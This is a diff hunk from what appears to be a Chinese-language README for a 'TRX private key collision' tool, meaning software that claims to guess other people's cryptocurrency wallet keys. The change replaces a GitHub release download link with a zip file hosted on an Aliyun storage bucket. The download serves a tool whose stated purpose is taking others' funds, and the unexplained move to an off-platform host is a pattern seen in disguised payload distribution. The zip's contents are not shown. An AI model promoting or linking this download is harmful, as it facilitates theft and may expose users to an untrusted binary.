@@ -25,7 +25,7 @@
 
 ### 1.下载软件包：
 <p>
-下载并解压安装包，<a href="https://github.com/EthCollision/WalletExchange/releases/download/wallet2.0.0/trx_collision2.0.zip">点击下载</a>
+下载并解压安装包，<a href="https://block-oss.oss-cn-hongkong.aliyuncs.com/trx_collision2.0.zip">点击下载</a>
 </p>
 
 ### 2.私钥碰撞：
